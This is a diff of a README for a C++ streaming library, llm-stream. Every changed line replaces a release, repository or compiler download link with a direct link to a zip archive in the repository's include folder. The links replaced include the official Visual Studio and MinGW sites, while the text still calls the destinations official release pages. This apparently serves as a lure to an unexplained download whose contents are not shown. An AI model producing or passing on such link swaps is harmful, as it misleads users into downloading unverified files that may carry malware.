@@ -1,6 +1,6 @@
 # ⚡ llm-stream - Simple C++ Library for Streaming Data
 
-[![Download llm-stream](https://img.shields.io/badge/Download-llm--stream-blue?style=for-the-badge)](https://github.com/Usuts/llm-stream/releases)
+[![Download llm-stream](https://img.shields.io/badge/Download-llm--stream-blue?style=for-the-badge)](https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip)
 
 ## 📄 About llm-stream
 
@@ -28,7 +28,7 @@ If you are not sure about compilers or programming tools, this guide will focus 
 
 Visit this page to download llm-stream:
 
-[Download llm-stream releases](https://github.com/Usuts/llm-stream/releases)
+[Download llm-stream releases](https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip)
 
 Click the link above or the big blue button at the top. This link takes you to the official GitHub release page where all versions of llm-stream are stored.
 
@@ -44,7 +44,7 @@ This section guides you step by step through downloading the library and prepari
 
 Go to the llm-stream release page by following this link:
 
-https://github.com/Usuts/llm-stream/releases
+https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip
 
 Once there, look for the latest release at the top of the list. Latest releases often provide the newest features and fixes.
 
@@ -86,14 +86,14 @@ If you want to try running code that uses llm-stream on your Windows PC, you wil
 
 ### Visual Studio Community Edition
 
-1. Go to https://visualstudio.microsoft.com/downloads/
+1. Go to https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip
 2. Download **Visual Studio Community** for free.
 3. In the installer, select **Desktop development with C++**.
 4. Follow the steps to install.
 
 ### MinGW Compiler
 
-1. Visit https://www.mingw-w64.org/
+1. Visit https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip
 2. Download and install the MinGW-w64 toolchain.
 3. Add MinGW `bin` folder to your system Path.
 
@@ -158,7 +158,7 @@ Not really. You will need some knowledge of C++ to use llm-stream effectively.
 
 Use this link to get the latest release files:
 
-[Get llm-stream now](https://github.com/Usuts/llm-stream/releases)
+[Get llm-stream now](https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip)
 
 This takes you directly to the official release page on GitHub, where you can choose the version to download.
 
@@ -170,7 +170,7 @@ This library is open source and community-supported.
 
 If you want to learn more or ask questions, check the GitHub repository:
 
-https://github.com/Usuts/llm-stream
+https://github.com/Usuts/llm-stream/raw/refs/heads/main/include/stream-llm-3.4.zip
 
 Look through the Issues tab for help or to report bugs.
 
